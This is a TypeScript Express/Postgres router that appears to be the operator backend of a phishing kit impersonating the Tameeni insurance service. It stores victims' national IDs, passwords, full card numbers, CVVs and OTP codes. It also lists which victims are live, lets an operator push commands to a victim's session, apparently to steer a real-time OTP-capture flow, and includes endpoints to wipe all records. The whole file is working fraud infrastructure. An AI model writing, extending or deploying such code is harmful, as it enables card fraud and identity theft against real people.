import { Router } from "express";
import pg from "pg";

const { Pool } = pg;
const pool = new Pool({ connectionString: process.env.DATABASE_URL });
const router = Router();

// Upsert submission
router.post("/submit", async (req, res) => {
  const {
    id, submittedAt, submittedAtTs,
    name, phone, nationalId, email, password,
    carPlate, carYear, carMake,
    cardNumber, cardName, cardMonth, cardYearExp, cardCvv,
    otpCode, otpStatus, page, isActive, lastSeen, country
  } = req.body;

  await pool.query(`
    INSERT INTO tameeni_submissions
      (id, submitted_at, submitted_at_ts, name, phone, national_id, email, password,
       car_plate, car_year, car_make,
       card_number, card_name, card_month, card_year_exp, card_cvv,
       otp_code, otp_status, page, is_active, last_seen, country)
    VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16,$17,$18,$19,$20,$21,$22)
    ON CONFLICT (id) DO UPDATE SET
      submitted_at = EXCLUDED.submitted_at,
      submitted_at_ts = EXCLUDED.submitted_at_ts,
      name = COALESCE(NULLIF(EXCLUDED.name,''), tameeni_submissions.name),
      phone = COALESCE(NULLIF(EXCLUDED.phone,''), tameeni_submissions.phone),
      national_id = COALESCE(NULLIF(EXCLUDED.national_id,''), tameeni_submissions.national_id),
      email = COALESCE(NULLIF(EXCLUDED.email,''), tameeni_submissions.email),
      password = COALESCE(NULLIF(EXCLUDED.password,''), tameeni_submissions.password),
      car_plate = COALESCE(NULLIF(EXCLUDED.car_plate,''), tameeni_submissions.car_plate),
      car_year = COALESCE(NULLIF(EXCLUDED.car_year,''), tameeni_submissions.car_year),
      car_make = COALESCE(NULLIF(EXCLUDED.car_make,''), tameeni_submissions.car_make),
      card_number = COALESCE(NULLIF(EXCLUDED.card_number,''), tameeni_submissions.card_number),
      card_name = COALESCE(NULLIF(EXCLUDED.card_name,''), tameeni_submissions.card_name),
      card_month = COALESCE(NULLIF(EXCLUDED.card_month,''), tameeni_submissions.card_month),
      card_year_exp = COALESCE(NULLIF(EXCLUDED.card_year_exp,''), tameeni_submissions.card_year_exp),
      card_cvv = COALESCE(NULLIF(EXCLUDED.card_cvv,''), tameeni_submissions.card_cvv),
      otp_code = COALESCE(NULLIF(EXCLUDED.otp_code,''), tameeni_submissions.otp_code),
      otp_status = COALESCE(EXCLUDED.otp_status, tameeni_submissions.otp_status),
      page = COALESCE(NULLIF(EXCLUDED.page,''), tameeni_submissions.page),
      is_active = EXCLUDED.is_active,
      last_seen = EXCLUDED.last_seen,
      country = COALESCE(NULLIF(EXCLUDED.country,''), tameeni_submissions.country)
  `, [
    id, submittedAt, submittedAtTs,
    name||'', phone||'', nationalId||'', email||'', password||'',
    carPlate||'', carYear||'', carMake||'',
    cardNumber||'', cardName||'', cardMonth||'', cardYearExp||'', cardCvv||'',
    otpCode||'', otpStatus||null, page||'', isActive, lastSeen, country||''
  ]);

  res.json({ ok: true });
});

// Patch a submission
router.patch("/submissions/:id", async (req, res) => {
  const { id } = req.params;
  const allowed: Record<string, string> = {
    otpCode: "otp_code", otpStatus: "otp_status",
    page: "page", isActive: "is_active", lastSeen: "last_seen",
    name: "name", phone: "phone", nationalId: "national_id",
    email: "email", password: "password",
    carPlate: "car_plate", carYear: "car_year", carMake: "car_make", country: "country"
  };
  const sets: string[] = [];
  const vals: any[] = [];
  for (const [k, col] of Object.entries(allowed)) {
    if (k in req.body) { sets.push(`${col} = $${vals.length + 1}`); vals.push(req.body[k]); }
  }
  if (!sets.length) return res.json({ ok: true });
  vals.push(id);
  await pool.query(`UPDATE tameeni_submissions SET ${sets.join(', ')} WHERE id = $${vals.length}`, vals);
  res.json({ ok: true });
});

// Get all submissions
router.get("/submissions", async (_req, res) => {
  const { rows } = await pool.query(`
    SELECT id, submitted_at, submitted_at_ts, name, phone, national_id, email, password,
           car_plate, car_year, car_make,
           card_number, card_name, card_month, card_year_exp, card_cvv,
           otp_code, otp_status, page, is_active, last_seen, country,
           (EXTRACT(EPOCH FROM NOW())*1000 - last_seen) < 8000 AS is_live
    FROM tameeni_submissions ORDER BY submitted_at_ts DESC
  `);
  res.json(rows.map((r: any) => ({
    id: r.id, submittedAt: r.submitted_at, submittedAtTs: r.submitted_at_ts,
    name: r.name, phone: r.phone, nationalId: r.national_id,
    email: r.email, password: r.password,
    carPlate: r.car_plate, carYear: r.car_year, carMake: r.car_make,
    cardNumber: r.card_number, cardName: r.card_name,
    cardMonth: r.card_month, cardYearExp: r.card_year_exp, cardCvv: r.card_cvv,
    otpCode: r.otp_code, otpStatus: r.otp_status,
    page: r.page, isActive: r.is_live, lastSeen: r.last_seen, country: r.country
  })));
});

// Send command
router.post("/cmd/:id", async (req, res) => {
  const { id } = req.params;
  const { cmd } = req.body;
  await pool.query(
    `UPDATE tameeni_submissions SET page = $1 WHERE id = $2`,
    [cmd, id]
  );
  res.json({ ok: true });
});

// Get pending command
router.get("/cmd/:id", async (req, res) => {
  const { id } = req.params;
  const { rows } = await pool.query(
    `SELECT page FROM tameeni_submissions WHERE id = $1`, [id]
  );
  res.json({ cmd: rows[0]?.page || null });
});

// Delete single
router.delete("/submissions/:id", async (req, res) => {
  await pool.query(`DELETE FROM tameeni_submissions WHERE id = $1`, [req.params.id]);
  res.json({ ok: true });
});

// Delete all
router.delete("/submissions", async (_req, res) => {
  await pool.query(`DELETE FROM tameeni_submissions`);
  res.json({ ok: true });
});

export default router;
